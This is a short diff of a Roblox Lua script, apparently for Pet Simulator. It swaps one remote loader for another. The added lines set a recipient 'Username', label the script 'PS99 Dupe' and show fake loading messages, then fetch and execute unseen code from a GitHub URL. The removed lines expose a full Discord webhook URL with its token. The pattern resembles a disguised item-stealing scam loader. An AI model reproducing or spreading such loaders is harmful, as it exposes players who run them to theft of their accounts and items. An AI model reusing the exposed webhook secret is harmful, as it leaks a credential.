@@ -1,4 +1,8 @@
-_G.UserID = 1263012707
-_G.WebHook = "https://discord.com/api/webhooks/1060689121695240342/oa4nkPyN3rsZFWQDw9lxNG2N1HQHRZ7IRz0l7qQBNhmwwlasxuaSG1XgWtu-0d7dPQhk"
-_G.LoadingScreenText = ""
-loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
+Username = "LostRobbe12349"
+_G.CustomScriptName = "PS99 Dupe" -- Main text
+_G.Text1 = "Script Loaded..." --tip test1
+_G.Text2 = "Waiting for Script" --tip test1
+_G.Text3 = "Checking Scripts..." --tip test1
+_G.Text4 = "Starting Scripts..." --tip test1
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
